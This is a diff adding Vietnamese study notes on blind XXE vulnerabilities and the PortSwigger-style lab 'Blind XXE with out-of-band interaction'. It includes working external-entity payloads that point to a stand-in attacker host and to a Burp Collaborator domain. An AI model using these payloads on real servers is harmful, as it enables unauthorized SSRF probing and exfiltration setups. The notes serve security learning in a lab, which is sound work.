@@ -118,3 +118,52 @@
 
 > DONE:
 > ![img](../asset/xxe-Exploiting-XXE-to-perform-SSRF-attacks-6.png) ![img](../asset/xxe-Exploiting-XXE-to-perform-SSRF-attacks-7.png)
+
+---
+
+## Blind XXE vulnerabilities
+
+> Nhiều trường hợp vul `XXE` bị mù. Điều này có nghĩa ứng dụng không trả về giá trị của bất kì `entity` nào bên ngoài đã được xác định trong `response` và do đó không thể truy xuất tệp
+>
+> `Blind XXE` vẫn có thể exploit và detected, nhưng cần một số biện pháp tiên tiến hơn. Đôi khi phải cần kỹ thuật `out-of-band` để find và exploit chúng để lấy data. Hoặc có thể kích hoạt `XML parsing errors` theo cách thông báo lỗi dữ liệu nhạy cảm
+
+### Detecting blind XXE using out-of-band (OAST) techniques
+
+> Thường có thể phát hiện `Blind XXE` bằng cách sử dụng kỹ thuật tương tác như đối với `XXE SSRF` nhưng kích hoạt tương tác mạng với `out-of-band` với hệ thống kiểm soát
+>
+> Ví dụ:
+>
+> ```
+> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+> ```
+
+> Sau đó, sử dụng `entity` đã xác định trong một giá trị dữ liệu trong `XML`
+>
+> Cuộc `attack XXE` này khiến `server` thực hiện một yêu cầu `backend` tới `URL` được chỉ định. `Attacker` có thể monitor kết quả `DNS` và yêu cầu `HTTP` do đó `XXE` thành công
+
+#### Lab: Blind XXE with out-of-band interaction
+
+> Des: Lab này có tính năng `check stock` phân tích cú pháp `XML` nhưng không hiển thị hết kết quả
+>
+> `Detect blind XXE vul` bằng cách kích hoạt `out-of-band` với miền bên ngoài
+>
+> Để solve dùng 1 `entity` bên ngoài cho trình phân tích `XML` tra cứu `DNS` và `Burp Collaborator`
+
+**Giao diện**
+![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-0.png)
+
+> Dùng Burp để chặn `request` và dùng `Burp Collaboratory`:
+> ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-1.png)
+
+> Sửa http lấy từ `Collaborator`:
+>
+> Thêm vào `XML`:
+>
+> ```
+> <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+> ```
+>
+> ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-2.png)
+
+> Xong:
+> ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-3.png) ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-4.png)
